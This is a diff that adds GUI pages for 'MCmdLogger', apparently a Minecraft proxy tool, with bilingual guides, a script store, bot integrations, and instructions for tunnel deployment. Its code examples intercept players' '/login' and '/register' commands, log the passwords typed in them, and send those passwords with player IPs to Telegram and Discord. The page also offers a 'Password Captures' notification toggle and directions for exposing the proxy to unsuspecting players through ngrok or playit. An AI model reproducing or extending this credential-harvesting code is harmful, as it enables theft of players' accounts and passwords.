+                    <div class="guide-section">
+                        <h2>📡 Player Events</h2>
+
+                        <div class="guide-code-block">
+                            <h4>Capturing messages and commands</h4>
+                            <pre><code>playerJoin(player => {
+    // Capture player chat messages
+    player.on("player_message", event => {
+        console.log(player.name + ": " + event.text);
+        
+        // Check for login command
+        if (event.text.startsWith("/login ") || 
+            event.text.startsWith("/register ")) {
+            console.log("🔑 Password: " + event.text);
+        }
+        
+        // Cancel message (prevent it from reaching server)
+        // event.cancel();
+    });
+    
+    // Capture server messages
+    player.on("server_message", event => {
+        console.log("Server -> " + player.name + ": " + event.text);
+    });
+});</code></pre>
+                        </div>
+
+                        <!-- Visual Flow -->
+                        <div class="guide-flow">
+                            <h4>Event Flow Visualization</h4>
+                            <div class="flow-diagram">
+                                <div class="flow-step">
+                                    <div class="flow-icon">👤</div>
+                                    <div class="flow-label">Player types<br><code>/login secret123</code></div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step highlight">
+                                    <div class="flow-icon">⚡</div>
+                                    <div class="flow-label">MCmdLogger<br>intercepts</div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step">
+                                    <div class="flow-icon">📝</div>
+                                    <div class="flow-label">Script logs<br>password</div>
+                                </div>
+                                <div class="flow-arrow">→</div>
+                                <div class="flow-step">
+                                    <div class="flow-icon">📤</div>
+                                    <div class="flow-label">Send to<br>Telegram</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Discord/Telegram Bots -->
+                    <div class="guide-section">
+                        <h2>🤖 Discord/Telegram Bots Integration</h2>
+
+                        <div class="guide-lang" data-lang="en">
+                            <p>You can send notifications to Discord/Telegram from your scripts using the built-in HTTP
+                                functions:</p>
+
+                            <div class="guide-code-block">
+                                <h4>Send to Telegram Bot</h4>
+                                <pre><code>// Your bot token and chat ID
+const BOT_TOKEN = "123456:ABC-DEF...";
+const CHAT_ID = "1091959360";
+
+function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    });
+}
+
+// Usage in playerJoin:
+playerJoin(player => {
+    sendTelegram(`🟢 <b>${player.name}</b> connected!`);
+    
+    player.on("player_message", event => {
+        if (event.text.startsWith("/login ") || 
+            event.text.startsWith("/register ")) {
+            sendTelegram(`🔑 <b>${player.name}</b>: <code>${event.text}</code>`);
+        }
+    });
+    
+    player.on("leave", () => {
+        sendTelegram(`🔴 <b>${player.name}</b> disconnected`);
+    });
+});</code></pre>
+                            </div>
+
+                            <div class="guide-code-block">
+                                <h4>Send to Discord Webhook</h4>
+                                <pre><code>const WEBHOOK_URL = "https://discord.com/api/webhooks/...";
+
+function sendDiscord(message, color = 0x00ff00) {
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [{
+                title: "MCmdLogger Alert",
+                description: message,
+                color: color,
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
+}
+
+// Usage:
+playerJoin(player => {
+    sendDiscord(`🟢 **${player.name}** connected from ${player.ip}`, 0x00ff00);
+    
+    player.on("player_message", event => {
+        if (event.text.includes("/login") || event.text.includes("/register")) {
+            sendDiscord(`🔑 **${player.name}**: \`${event.text}\``, 0xffff00);
+        }
+    });
+});</code></pre>
+                            </div>
+
+                            <div class="tip-box">
+                                <h4>💡 Pro Tip</h4>
+                                <p>Use the built-in Integrations page to configure Discord/Telegram. The GUI
+                                    automatically handles notifications for player joins, password captures, and errors
+                                    - no scripting required!</p>
+                            </div>
+                        </div>
+
+                        <div class="guide-lang" data-lang="ru">
+                            <p>Вы можете отправлять уведомления в Discord/Telegram из скриптов используя встроенные HTTP
+                                функции:</p>
+
+                            <div class="guide-code-block">
+                                <h4>Отправка в Telegram бота</h4>
+                                <pre><code>// Ваш токен бота и ID чата
+const BOT_TOKEN = "123456:ABC-DEF...";
+const CHAT_ID = "1091959360";
+
+function sendTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    });
+}
+
+// Использование в playerJoin:
+playerJoin(player => {
+    sendTelegram(`🟢 <b>${player.name}</b> подключился!`);
+    
+    player.on("player_message", event => {
+        if (event.text.startsWith("/login ") || 
+            event.text.startsWith("/register ")) {
+            sendTelegram(`🔑 <b>${player.name}</b>: <code>${event.text}</code>`);
+        }
+    });
+    
+    player.on("leave", () => {
+        sendTelegram(`🔴 <b>${player.name}</b> отключился`);
+    });
+});</code></pre>
+                            </div>
+
+                            <div class="guide-code-block">
+                                <h4>Отправка в Discord Webhook</h4>
+                                <pre><code>const WEBHOOK_URL = "https://discord.com/api/webhooks/...";
+
+function sendDiscord(message, color = 0x00ff00) {
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [{
+                title: "MCmdLogger Уведомление",
+                description: message,
+                color: color,
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
+}
+
+// Использование:
+playerJoin(player => {
+    sendDiscord(`🟢 **${player.name}** подключился с ${player.ip}`, 0x00ff00);
+    
+    player.on("player_message", event => {
+        if (event.text.includes("/login") || event.text.includes("/register")) {
+            sendDiscord(`🔑 **${player.name}**: \`${event.text}\``, 0xffff00);
+        }
+    });
+});</code></pre>
+                            </div>
+
+                            <div class="tip-box">
+                                <h4>💡 Совет</h4>
+                                <p>Используйте встроенную страницу Интеграции для настройки Discord/Telegram. GUI
+                                    автоматически обрабатывает уведомления о входах игроков, перехваченных паролях и
+                                    ошибках - без необходимости писать скрипты!</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Script Store Section -->
+            <section class="content-section" id="scriptstore-section">
+                <div class="section-header">
+                    <h1 data-i18n="scriptstore.title">Script Store</h1>
+                    <p data-i18n="scriptstore.subtitle">Download ready-to-use scripts</p>
+                </div>
+
+                <div class="store-filters">
+                    <div class="filter-tabs" id="categoryTabs">
+                        <button class="filter-tab active" data-category="all">All</button>
+                        <button class="filter-tab" data-category="logging">Logging</button>
+                        <button class="filter-tab" data-category="bypass">Bypass</button>
+                        <button class="filter-tab" data-category="integrations">Integrations</button>
+                        <button class="filter-tab" data-category="debug">Debug</button>
+                    </div>
+                </div>
+
+                <div class="scripts-grid" id="scriptsGrid">
+                    <!-- Scripts will be loaded dynamically -->
+                    <div class="loading-placeholder">
+                        <div class="spinner"></div>
+                        <p>Loading scripts...</p>
+                    </div>
+                </div>
+
+                <div class="installed-scripts">
+                    <h3 data-i18n="scriptstore.installed">Installed Scripts</h3>
+                    <div class="installed-list" id="installedScriptsList">
+                        <!-- Installed scripts will be shown here -->
+                    </div>
+                </div>
+            </section>
+
+            <!-- Script Editor Section -->
+            <section class="content-section" id="scripteditor-section">
+                <div class="section-header">
+                    <h1 data-i18n="scripteditor.title">Script Editor</h1>
+                    <p data-i18n="scripteditor.subtitle">Edit and configure your installed scripts</p>
+                </div>
+
+                <div class="editor-layout">
+                    <!-- Script Selector -->
+                    <div class="editor-sidebar">
+                        <h3 data-i18n="scripteditor.installedScripts">Installed Scripts</h3>
+                        <div class="editor-script-list" id="editorScriptList">
+                            <!-- Scripts will be loaded here -->
+                            <p class="text-muted" data-i18n="scripteditor.noScripts">No scripts installed</p>
+                        </div>
+                        <button class="btn btn-outline btn-full" onclick="openScriptsFolder()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16"
+                                height="16">
+                                <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z" />
+                            </svg>
+                            <span data-i18n="scripteditor.openFolder">Open Folder</span>
+                        </button>
+                    </div>
+                    <!-- Main Editor Area -->
+                    <div class="editor-main">
+                        <!-- Script Settings Panel -->
+                        <div class="editor-settings" id="scriptSettings" style="display: none;">
+                            <h3><span id="editingScriptName">Script</span> <span
+                                    data-i18n="scripteditor.settings">Settings</span></h3>
+
+                            <!-- General Settings -->
+                            <div class="settings-category">
+                                <div class="category-header">
+                                    <span class="category-icon">⚙️</span>
+                                    <h4>General Settings</h4>
+                                </div>
+                                <div class="settings-grid" id="scriptSettingsGrid">
+                                    <!-- Settings will be loaded dynamically based on script -->
+                                </div>
+                            </div>
+
+                            <!-- Telegram Integration -->
+                            <div class="settings-category integration-category" id="telegramCategory">
+                                <div class="category-header">
+                                    <span class="category-icon">📱</span>
+                                    <h4>Telegram Notifications</h4>
+                                    <label class="toggle-switch category-toggle">
+                                        <input type="checkbox" id="telegramEnabled"
+                                            onchange="toggleIntegrationCategory('telegram')">
+                                        <span class="toggle-slider"></span>
+                                    </label>
+                                </div>
+                                <div class="settings-grid integration-settings" id="telegramSettings">
+                                    <!-- Telegram notification toggles will be added here -->
+                                </div>
+                            </div>
+
+                            <!-- Discord Integration -->
+                            <div class="settings-category integration-category" id="discordCategory">
+                                <div class="category-header">
+                                    <span class="category-icon">
+                                        <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20">
+                                            <path
+                                                d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128c.126-.094.252-.192.373-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z" />
+                                        </svg>
+                                    </span>
+                                    <h4>Discord Notifications</h4>
+                                    <label class="toggle-switch category-toggle">
+                                        <input type="checkbox" id="discordEnabled"
+                                            onchange="toggleIntegrationCategory('discord')">
+                                        <span class="toggle-slider"></span>
+                                    </label>
+                                </div>
+                                <div class="settings-grid integration-settings" id="discordSettings">
+                                    <!-- Discord notification toggles will be added here -->
+                                </div>
+                            </div>
+
+                            <button class="btn btn-primary" onclick="saveScriptSettings()">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16"
+                                    height="16">
+                                    <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z" />
+                                    <polyline points="17 21 17 13 7 13 7 21" />
+                                    <polyline points="7 3 7 8 15 8" />
+                                </svg>
+                                <span data-i18n="scripteditor.saveSettings">Save Settings</span>
+                            </button>
+                        </div>
+
+                        <!-- Code Editor -->
+                        <div class="code-editor-container" id="codeEditorContainer" style="display: none;">
+                            <div class="editor-toolbar">
+                                <span class="editor-filename" id="editorFilename">script.js</span>
+                                <div class="editor-actions">
+                                    <button class="btn btn-small btn-outline" onclick="reloadScript()">
+                                        <span data-i18n="scripteditor.reload">Reload</span>
+                                    </button>
+                                    <button class="btn btn-small btn-primary" onclick="saveScript()">
+                                        <span data-i18n="scripteditor.save">Save</span>
+                                    </button>
+                                </div>
+                            </div>
+                            <textarea id="codeEditor" class="code-editor" spellcheck="false"></textarea>
+                            <div class="editor-status" id="editorStatus"></div>
+                        </div>
+
+                        <!-- Empty State -->
+                        <div class="editor-empty" id="editorEmpty">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="64"
+                                height="64">
+                                <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7" />
+                                <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z" />
+                            </svg>
+                            <h3 data-i18n="scripteditor.selectScript">Select a script to edit</h3>
+                            <p data-i18n="scripteditor.selectScriptHint">Choose a script from the list on the left to
+                                view and edit its code and settings</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Integrations Section -->
+            <section class="content-section" id="integrations-section">
+                <div class="section-header">
+                    <h1 data-i18n="integrations.title">Integrations</h1>
+                    <p data-i18n="integrations.subtitle">Connect Discord and Telegram bots for notifications and remote
+                        control</p>
+                </div>
+
+                <div class="integrations-grid">
+                    <!-- Discord Card -->
+                    <div class="integration-card">
+                        <div class="integration-header discord">
+                            <svg viewBox="0 0 24 24" fill="currentColor">
+                                <path
+                                    d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z" />
+                            </svg>
+                            <h2>Discord</h2>
+                        </div>
+                        <div class="integration-body">
+                            <div class="form-group">
+                                <label data-i18n="integrations.botToken">Bot Token</label>
+                                <input type="password" id="discordToken" placeholder="Enter bot token">
+                            </div>
+                            <div class="form-group">
+                                <label data-i18n="integrations.channelId">Channel ID</label>
+                                <input type="text" id="discordChannelId"
+                                    data-i18n-placeholder="integrations.channelPlaceholder"
+                                    placeholder="Channel ID for notifications">
+                            </div>
+                            <div class="integration-divider" data-i18n="integrations.orWebhook">or use Webhook</div>
+                            <div class="form-group">
+                                <label data-i18n="integrations.webhookUrl">Webhook URL</label>
+                                <input type="text" id="discordWebhook"
+                                    placeholder="https://discord.com/api/webhooks/...">
+                            </div>
+                            <div class="integration-actions">
+                                <button class="btn btn-outline" onclick="testDiscordConnection()"><span
+                                        data-i18n="integrations.testConnection">Test Connection</span></button>
+                                <button class="btn btn-primary" onclick="connectDiscord()"><span
+                                        data-i18n="integrations.connect">Connect</span></button>
+                            </div>
+                            <div class="integration-status" id="discordStatus"></div>
+                        </div>
+                    </div>
+
+                    <!-- Telegram Card -->
+                    <div class="integration-card">
+                        <div class="integration-header telegram">
+                            <svg viewBox="0 0 24 24" fill="currentColor">
+                                <path
+                                    d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" />
+                            </svg>
+                            <h2>Telegram</h2>
+                        </div>
+                        <div class="integration-body">
+                            <div class="form-group">
+                                <label data-i18n="integrations.botToken">Bot Token</label>
+                                <input type="password" id="telegramToken" placeholder="123456:ABC-DEF...">
+                            </div>
+                            <div class="form-group">
+                                <label data-i18n="integrations.chatId">Chat ID</label>
+                                <input type="text" id="telegramChatId"
+                                    data-i18n-placeholder="integrations.chatIdPlaceholder" placeholder="Your chat ID">
+                            </div>
+                            <div class="integration-actions">
+                                <button class="btn btn-outline" onclick="testTelegramConnection()"><span
+                                        data-i18n="integrations.testConnection">Test Connection</span></button>
+                                <button class="btn btn-primary" onclick="connectTelegram()"><span
+                                        data-i18n="integrations.connect">Connect</span></button>
+                            </div>
+                            <div class="integration-status" id="telegramStatus"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Notification Settings -->
+                <div class="notifications-settings">
+                    <h3 data-i18n="integrations.notificationSettings">Notification Settings</h3>
+                    <div class="toggle-grid">
+                        <div class="toggle-item">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="notifyPlayerJoin" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                            <span data-i18n="integrations.notifyJoinLeave">Player Join/Leave</span>
+                        </div>
+                        <div class="toggle-item">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="notifyPasswords" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                            <span data-i18n="integrations.notifyPasswords">Password Captures</span>
+                        </div>
+                        <div class="toggle-item">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="notifyErrors" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                            <span data-i18n="integrations.notifyErrors">Errors & Crashes</span>
+                        </div>
+                        <div class="toggle-item">
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="notifyCustom" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                            <span data-i18n="integrations.notifyCustom">Custom Script Events</span>
+                        </div>
+                    </div>
+                    <button class="btn btn-primary" onclick="saveNotificationSettings()"><span
+                            data-i18n="integrations.saveSettings">Save Settings</span></button>
+                    <button class="btn btn-outline" onclick="sendTestNotification()"><span
+                            data-i18n="integrations.testNotification">Send Test Notification</span></button>
+                </div>
+
+                <!-- Remote Control Info -->
+                <div class="remote-control-info">
+                    <h3 data-i18n="integrations.remoteTitle">🎮 Remote Control via Bots</h3>
+                    <p data-i18n="integrations.remoteDesc">Once connected, you can control MCmdLogger from
+                        Discord/Telegram:</p>
+                    <div class="remote-commands">
+                        <div class="remote-cmd">
+                            <code>/cmd &lt;command&gt;</code>
+                            <span data-i18n="integrations.cmdHelp">Execute any MCmdLogger command</span>
+                        </div>
+                        <div class="remote-cmd">
+                            <code>/status</code>
+                            <span data-i18n="integrations.statusHelp">Check if MCmdLogger is running</span>
+                        </div>
+                        <div class="remote-cmd">
+                            <code>/players</code>
+                            <span data-i18n="integrations.playersHelp">List connected players</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Deployment Section -->
+            <section class="content-section" id="deployment-section">
+                <div class="section-header">
+                    <h1 data-i18n="deployment.title">Deployment Guide</h1>
+                    <p data-i18n="deployment.subtitle">Learn how to deploy MCmdLogger for 24/7 operation</p>
+                </div>
+
+                <!-- Version Compatibility -->
+                <div class="deployment-card warning-card">
+                    <div class="card-icon-wrapper warning">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <line x1="12" y1="8" x2="12" y2="12" />
+                            <line x1="12" y1="16" x2="12.01" y2="16" />
+                        </svg>
+                    </div>
+                    <div>
+                        <h3 data-i18n="deployment.versionTitle">Version Compatibility</h3>
+                        <p data-i18n="deployment.versionDesc">This documentation is for MCmdLogger version 3.10+. Older
+                            versions (v9 and earlier) may have different features:</p>
+                        <ul>
+                            <li data-i18n="deployment.v9Feature">v9 and earlier: May have built-in ngrok integration
+                            </li>
+                            <li data-i18n="deployment.v10Feature">v10+: External tunneling required (ngrok, playit)</li>
+                        </ul>
+                        <p><span data-i18n="deployment.recommend">We recommend using the latest version from</span> <a
+                                href="#" onclick="openExternal('https://voxelhax.com/mcmdlogger')">voxelhax.com</a></p>
+                    </div>
+                </div>
+
+                <!-- Tunneling Services Comparison -->
+                <div class="deployment-section">
+                    <h2 data-i18n="deployment.tunnelingTitle">🌐 Tunneling Services</h2>
+                    <p data-i18n="deployment.tunnelingDesc">To make your MCmdLogger proxy accessible from the internet,
+                        you need a tunneling service:</p>
+
+                    <div class="comparison-table">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th data-i18n="deployment.feature">Feature</th>
+                                    <th class="highlight-ngrok">ngrok</th>
+                                    <th class="highlight-playit">playit.gg</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td data-i18n="deployment.freePlan">Free Plan</td>
+                                    <td data-i18n="deployment.ngrokFree">✅ Limited (1 tunnel)</td>
+                                    <td data-i18n="deployment.playitFree">✅ Generous</td>
+                                </tr>
+                                <tr>
+                                    <td data-i18n="deployment.customDomain">Custom Domain</td>
+                                    <td><span data-i18n="deployment.ngrokPrice">💰 $8/month</span></td>
+                                    <td data-i18n="deployment.notAvailable">❌ Not available</td>
+                                </tr>
+                                <tr>
+                                    <td data-i18n="deployment.minecraftTcp">Minecraft TCP</td>
+                                    <td data-i18n="deployment.fullSupport">✅ Full support</td>
+                                    <td data-i18n="deployment.fullSupport">✅ Full support</td>
+                                </tr>
+                                <tr>
+                                    <td data-i18n="deployment.setupDifficulty">Setup Difficulty</td>
+                                    <td data-i18n="deployment.medium">⭐⭐ Medium</td>
+                                    <td data-i18n="deployment.easy">⭐ Easy</td>
+                                </tr>
+                                <tr>
+                                    <td data-i18n="deployment.registration">Registration</td>
+                                    <td data-i18n="deployment.required">Required</td>
+                                    <td data-i18n="deployment.required">Required</td>
+                                </tr>
+                                <tr>
+                                    <td data-i18n="deployment.recommendation">Recommendation</td>
+                                    <td data-i18n="deployment.bestDomains">🏆 Best for custom domains</td>
+                                    <td data-i18n="deployment.bestBeginners">🏆 Best for beginners</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="tunnel-actions">
+                        <button class="btn btn-primary" onclick="openExternal('https://ngrok.com')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                                <polyline points="15 3 21 3 21 9" />
+                                <line x1="10" y1="14" x2="21" y2="3" />
+                            </svg>
+                            <span data-i18n="deployment.openNgrok">Open ngrok.com</span>
+                        </button>
+                        <button class="btn btn-outline" onclick="openExternal('https://playit.gg')">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                                <polyline points="15 3 21 3 21 9" />
+                                <line x1="10" y1="14" x2="21" y2="3" />
+                            </svg>
+                            <span data-i18n="deployment.openPlayit">Open playit.gg</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ngrok Guide -->
+                <div class="deployment-section">
+                    <!-- EN Version -->
+                    <div class="guide-lang" data-lang="en">
+                        <h2>📖 ngrok Setup Guide</h2>
+                        <div class="guide-steps">
+                            <div class="step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <h4>Create an Account</h4>
+                                    <p>Register at <a href="#"
+                                            onclick="openExternal('https://dashboard.ngrok.com/signup')">ngrok.com</a>
+                                        (free)</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <h4>Download ngrok</h4>
+                                    <p>Download the ngrok agent for your OS from the dashboard</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <h4>Configure Auth Token</h4>
+                                    <pre><code>ngrok config add-authtoken YOUR_TOKEN_HERE</code></pre>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">4</div>
+                                <div class="step-content">
+                                    <h4>Start Tunnel</h4>
+                                    <pre><code>ngrok tcp 25565</code></pre>
+                                    <p>This creates a tunnel to your local port 25565</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">5</div>
+                                <div class="step-content">
+                                    <h4>Get Your Address</h4>
+                                    <p>You'll see something like: <code>0.tcp.ngrok.io:12345</code></p>
+                                    <p>Share this address with players to connect!</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- RU Version -->
+                    <div class="guide-lang" data-lang="ru">
+                        <h2>📖 Настройка ngrok</h2>
+                        <div class="guide-steps">
+                            <div class="step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <h4>Создайте аккаунт</h4>
+                                    <p>Зарегистрируйтесь на <a href="#"
+                                            onclick="openExternal('https://dashboard.ngrok.com/signup')">ngrok.com</a>
+                                        (бесплатно)</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <h4>Скачайте ngrok</h4>
+                                    <p>Скачайте ngrok агент для вашей ОС из панели управления</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <h4>Настройте Auth Token</h4>
+                                    <pre><code>ngrok config add-authtoken ВАШ_ТОКЕН_ЗДЕСЬ</code></pre>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">4</div>
+                                <div class="step-content">
+                                    <h4>Запустите туннель</h4>
+                                    <pre><code>ngrok tcp 25565</code></pre>
+                                    <p>Это создаст туннель на ваш локальный порт 25565</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">5</div>
+                                <div class="step-content">
+                                    <h4>Получите адрес</h4>
+                                    <p>Вы увидите что-то типа: <code>0.tcp.ngrok.io:12345</code></p>
+                                    <p>Поделитесь этим адресом с игроками для подключения!</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- playit.gg Guide -->
+                <div class="deployment-section">
+                    <!-- EN Version -->
+                    <div class="guide-lang" data-lang="en">
+                        <h2>📖 playit.gg Setup Guide</h2>
+                        <div class="guide-steps">
+                            <div class="step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <h4>Download playit Agent</h4>
+                                    <p>Download from <a href="#"
+                                            onclick="openExternal('https://playit.gg/download')">playit.gg/download</a>
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <h4>Run the Agent</h4>
+                                    <p>Run <code>playit.exe</code> and follow the on-screen instructions</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <h4>Create a Tunnel</h4>
+                                    <p>In the dashboard, create a new tunnel:</p>
+                                    <ul>
+                                        <li>Type: <strong>Minecraft Java</strong></li>
+                                        <li>Local Port: <strong>25565</strong></li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">4</div>
+                                <div class="step-content">
+                                    <h4>Get Your Address</h4>
+                                    <p>You'll receive an address like: <code>random.joinmc.link</code></p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- RU Version -->
+                    <div class="guide-lang" data-lang="ru">
+                        <h2>📖 Настройка playit.gg</h2>
+                        <div class="guide-steps">
+                            <div class="step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <h4>Скачайте playit Agent</h4>
+                                    <p>Скачайте с <a href="#"
+                                            onclick="openExternal('https://playit.gg/download')">playit.gg/download</a>
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <h4>Запустите агент</h4>
+                                    <p>Запустите <code>playit.exe</code> и следуйте инструкциям на экране</p>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <h4>Создайте туннель</h4>
+                                    <p>В панели управления создайте новый туннель:</p>
+                                    <ul>
+                                        <li>Тип: <strong>Minecraft Java</strong></li>
+                                        <li>Локальный порт: <strong>25565</strong></li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <div class="step">
+                                <div class="step-number">4</div>
+                                <div class="step-content">
+                                    <h4>Получите адрес</h4>
